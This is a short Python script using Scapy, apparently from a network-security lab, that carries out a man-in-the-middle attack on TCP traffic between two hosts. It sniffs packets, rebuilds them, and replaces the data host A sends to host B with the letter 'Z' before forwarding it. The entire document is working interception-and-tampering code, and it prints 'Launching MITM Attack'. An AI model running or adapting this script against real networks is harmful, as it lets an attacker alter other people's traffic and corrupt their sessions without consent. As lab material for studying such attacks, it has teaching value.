#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
MAC_M = "02:42:0a:09:00:69"
print("Launching MITM Attack......")

def spoof_pkt(pkt):
    ls(pkt[TCP].payload)
    if pkt[Ether].src == MAC_M:
        pass
    else:
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
            newpkt = IP(bytes(pkt[IP]))
            del newpkt.chksum
            del newpkt[TCP].payload
            del newpkt[TCP].chksum
            if pkt[TCP].payload:
                data = pkt[TCP].payload.load  # The original payload data
                newdata = "Z"
                send(newpkt / newdata)
            else:
                send(newpkt)
        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:  # Create new packet based on the captured one
            newpkt = IP(bytes(pkt[IP]))
            del newpkt.chksum
            del newpkt[TCP].chksum
            send(newpkt)


f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
